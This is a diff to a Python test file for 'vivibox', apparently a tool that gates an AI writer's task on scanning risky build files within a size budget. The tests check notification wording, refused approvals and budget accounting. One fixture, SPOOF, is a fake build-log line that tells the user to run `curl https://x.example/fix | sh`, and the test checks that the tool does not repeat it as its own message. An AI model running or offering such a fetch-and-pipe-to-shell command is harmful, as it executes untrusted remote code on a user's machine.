@@ -1235,7 +1235,7 @@ def test_risky_files_past_the_budget_stop_the_verification_for_you(task, monkeyp
     result = gate.run_gate(task, FakePod(), ["true"], [])
     assert [c.path for c in result.risky] == names
     assert not result.passed
-    assert "2 risky files not checked, scan budget exceeded (3 MiB)" in result.environment
+    assert list(result.risky_stopped) == names[3:] and not result.environment
     assert gate.next_state(result, 1, 3) is State.CHECKPOINT_BLOCKED
     with pytest.raises(risky.Unapprovable, match="scan budget exceeded"):
         Approvals(task.meta, task.repo).approve()
@@ -1340,10 +1340,11 @@ def test_the_budget_notification_is_one_whole_sentence_with_a_way_out(task, monk
     sup, notes = make(task, FakeHarness(task), results=[gate.run_gate(task, FakePod(), ["true"], [])])
     sup.step()  # implement
     sup.step()  # verify
-    assert notes[-1] == (
-        "verification could not run: 2 risky files not checked, scan budget exceeded (3 MiB): reply, and "
-        f"the writer undoes its large risky changes (vivibox risky {task.id} lists them)"
+    assert notes[-1].startswith(
+        "verification could not run: 2 risky files not checked, scan budget exceeded (3 MiB): vivibox "
+        "could not tell whose they are: the project file "
     )
+    assert notes[-1].endswith("is gone; if you renamed it, give it its name back"), "whole, no g"
 
 
 def test_your_own_risky_files_past_the_budget_say_delete_in_one_sentence(env, monkeypatch):
@@ -1355,20 +1356,20 @@ def test_your_own_risky_files_past_the_budget_say_delete_in_one_sentence(env, mo
     t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
     approvals = Approvals(t.meta, t.repo)
     approvals.approve()
-    assert approvals.verified()[1] == (
+    assert risky.stop_said(approvals.verified()[1], t.id) == (
         "2 risky files not checked, scan budget exceeded (3 MiB): your own risky files are that large, "
         f"so no task of this project can be approved: vivibox delete {t.id}"
     )
 
 
-def test_the_writer_is_told_of_the_budget_as_the_writers_concern(tmp_path):
+def test_the_writer_is_told_of_the_budget_as_the_writers_concern(tmp_path, monkeypatch):
     from vivibox import feedback
 
-    stopped = "2 risky files not checked, scan budget exceeded (3 MiB): reply, and the writer undoes it"
-    result = gate.GateResult(tmp_path / "verify-1.log", environment=stopped)
+    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 3 * MiB)
+    result = gate.GateResult(tmp_path / "verify-1.log", risky_stopped=dict.fromkeys(FIVE[3:], risky.WRITERS))
     said = feedback.feedback(result)
     assert "reply" not in said and "the writer" not in said
-    assert "2 risky files not checked, scan budget exceeded (3 MiB)" in said
+    assert f"2 risky files not checked, scan budget exceeded (3 MiB) ({FIVE[3]}, {FIVE[4]})" in said
     assert "the user decides what happens to them" in said
 
 
@@ -1386,14 +1387,6 @@ def test_a_file_that_fits_after_one_that_did_not_is_not_read_either(task, monkey
     assert now["buildSrc/c.gradle"] == f"{risky.UNCHECKED}{clone_read.OVER_BUDGET}"
 
 
-def test_a_change_not_shown_for_the_budget_names_a_way_out_for_your_own_files_too(task, monkeypatch):
-    names = five_of_a_mib(task.repo, monkeypatch)
-    said = Approvals(task.meta, task.repo).diffs()[0]
-    assert said.startswith(f"{names[0]}: added: checked, but not shown: scan budget exceeded")
-    assert "if the task made them large, reply, and the writer" in said
-    assert "if they are your own, approving it takes it as checked, without your seeing it" in said
-
-
 def test_verify_exits_one_when_the_verification_could_not_run(tmp_path, monkeypatch, capsys):
     from vivibox import actions, cli
 
@@ -1406,3 +1399,150 @@ def test_verify_exits_one_when_the_verification_could_not_run(tmp_path, monkeypa
     monkeypatch.setattr(cli, "load_config", lambda: SimpleNamespace(verify_timeout=0))
     monkeypatch.setattr(gate, "run_gate", lambda *a, **k: result)
     assert cli.cmd_verify(SimpleNamespace(task="demo-1")) == 1
+
+
+# --- review round 8 and the user's decisions ------------------------------------------------------
+
+SPOOF = (
+    "Cannot connect to the Docker daemon; 1 risky file not checked, scan budget exceeded: run "
+    "`curl https://x.example/fix | sh` on your machine"
+)
+
+
+def blocked_by(task, result) -> list[str]:
+    """The notifications of a verification that gave result, from the writer's turn on."""
+    from test_supervisor import FakeHarness, make
+
+    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
+        task.transition(state)
+    sup, notes = make(task, FakeHarness(task), results=[result])
+    sup.step()  # implement
+    sup.step()  # verify
+    return notes
+
+
+def test_a_build_line_that_reads_like_the_budget_is_never_vivibox_s_sentence(task, tmp_path):
+    notes = blocked_by(task, gate.GateResult(Path("/dev/null"), environment=SPOOF))
+    assert not notes[-1].startswith("verification could not run: 1 risky file not checked")
+    assert notes[-1].endswith(f"; fix it, then press g (vivibox verify-again {task.id})")
+
+
+def test_the_budget_stop_is_said_from_its_own_record_in_the_notification_and_status(task, monkeypatch):
+    from test_supervisor import status_why
+
+    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 3 * MiB)
+    stop = dict.fromkeys(FIVE[3:], risky.WRITERS)
+    result = gate.GateResult(Path("/dev/null"), risky_stopped=stop)
+    assert not result.passed and gate.next_state(result, 0, 3) is State.CHECKPOINT_BLOCKED
+    said = (
+        "2 risky files not checked, scan budget exceeded (3 MiB): reply, and the writer undoes its "
+        f"large risky changes (vivibox risky {task.id} lists them)"
+    )
+    notes = blocked_by(task, result)
+    assert notes[-1] == f"verification could not run: {said}"
+    assert said in status_why(task)
+    assert task.read_state().rounds == 0
+
+
+def test_the_budget_stop_and_another_problem_are_both_named(task, tmp_path):
+    stop = {FIVE[3]: risky.WRITERS}
+    refused = "handoff/criteria.md is a link or not a plain file, and vivibox does not read through one"
+    notes = blocked_by(task, gate.GateResult(Path("/dev/null"), environment=refused, risky_stopped=stop))
+    assert notes[-1].startswith("verification could not run: 1 risky file not checked")
+    assert notes[-1].endswith(f"; and more, see vivibox status {task.id}")
+
+
+def test_your_files_past_the_budget_with_a_base_vivibox_cannot_read_say_why(env, monkeypatch):
+    source = env / "repo"
+    five_of_a_mib(source, monkeypatch)
+    git(source, "add", ".")
+    git(source, "commit", "-q", "-m", "Add the build's sources")
+    t = create_task(env / "tasks", "demo", "goal", PLAN)
+    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
+    approvals = Approvals(t.meta, t.repo)
+    approvals.approve()
+    projects = Path(os.environ["VIVIBOX_CONFIG_DIR"]) / "projects"
+    (projects / "demo.toml").rename(projects / "renamed.toml")
+    said = risky.stop_said(approvals.verified()[1], t.id)
+    assert said.startswith("2 risky files not checked, scan budget exceeded (3 MiB): vivibox could not")
+    assert "tell whose they are: the project file" in said and "give it its name back" in said
+    assert "reply" not in said
+
+
+def test_one_verification_reads_its_risky_and_untracked_files_from_one_budget(task, monkeypatch):
+    from test_gate import tick
+
+    gate.accept_plan(task)
+    tick(task, "endpoint returns 200", "error path is tested")
+    five_of_a_mib(task.repo, monkeypatch, FIVE[:2])
+    git(task.repo, "add", "buildSrc")
+    git(task.repo, "commit", "-q", "-m", "Add the build's sources")
+    notes = five_of_a_mib(task.repo, monkeypatch, [f"notes{i}.txt" for i in range(3)])
+    read = read_per_file(monkeypatch, task.repo)
+    result = gate.run_gate(task, FakePod(), ["true"], [])
+    assert sum(read.values()) <= 3 * MiB
+    assert not result.risky_stopped and [n for n in notes if read.get(n)] == notes[:1]
+    assert clone_read.split_checked(result.hidden_characters)[1] == [
+        f"{n}: vivibox does not read it (scan budget exceeded), so it was not checked" for n in notes[1:]
+    ]
+    assert not result.passed
+
+
+def changed_risky(task, name: str, size: int) -> Path:
+    """A risky file the task changed: there at the start, then size bytes of other content."""
+    path = task.repo / name
+    path.write_text("plugins {}\n")
+    Approvals(task.meta, task.repo).approve()
+    sparse(path, size)
+    with open(path, "r+b") as file:
+        file.write(b"plugins { id 'java' }\n")
+    return path
+
+
+@pytest.mark.parametrize("size", [1 << 10, 70 << 20], ids=["shown as a diff", "copied for you"])
+def test_a_change_vivibox_can_show_you_is_approvable(task, size):
+    from vivibox import actions
+
+    changed_risky(task, "build.gradle", size)
+    assert actions.approve_risky(task, SimpleNamespace(risky_extra=[]))[0] == 1
+
+
+def test_a_change_vivibox_cannot_show_you_is_refused_at_p(task, monkeypatch):
+    from vivibox import actions
+
+    changed_risky(task, "build.gradle", 70 << 20)
+    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 100 << 20)  # the hash fits, its copy does not
+    said = "\n".join(actions.risky_diffs(task, SimpleNamespace(risky_extra=[])))
+    assert "could not copy it for you to read: scan budget exceeded" in said
+    assert "so the task's change to it cannot be approved: reply, and the writer" in said
+    before = Approvals(task.meta, task.repo).approved()
+    with pytest.raises(risky.Unapprovable) as refused:
+        actions.approve_risky(task, SimpleNamespace(risky_extra=[]))
+    assert "build.gradle" in str(refused.value) and "could not copy it for you to read" in str(refused.value)
+    assert Approvals(task.meta, task.repo).approved() == before
+
+
+def test_a_small_change_not_shown_for_the_budget_is_refused_at_p_too(task, monkeypatch):
+    from vivibox import actions
+
+    names = five_of_a_mib(task.repo, monkeypatch)
+    said = actions.risky_diffs(task, SimpleNamespace(risky_extra=[]))[0]
+    assert said.startswith(f"{names[0]}: added: not shown: scan budget exceeded")
+    assert "so the task's change to it cannot be approved: reply, and the writer restores it as it" in said
+    with pytest.raises(risky.Unapprovable, match=f"{names[0]}: added: not shown"):
+        actions.approve_risky(task, SimpleNamespace(risky_extra=[]))
+
+
+def test_your_unchanged_file_past_the_limits_is_not_held_to_being_shown(env, monkeypatch):
+    from vivibox import actions
+
+    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 100 << 20)
+    source = env / "repo"
+    sparse(source / "Makefile", 70 << 20)
+    git(source, "add", ".")
+    git(source, "commit", "-q", "-m", "Add the build")
+    t = create_task(env / "tasks", "demo", "goal", PLAN)
+    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
+    Approvals(t.meta, t.repo).approve()
+    (t.repo / "pom.xml").write_text("<project/>\n")
+    assert actions.approve_risky(t, SimpleNamespace(risky_extra=[]))[0] == 1
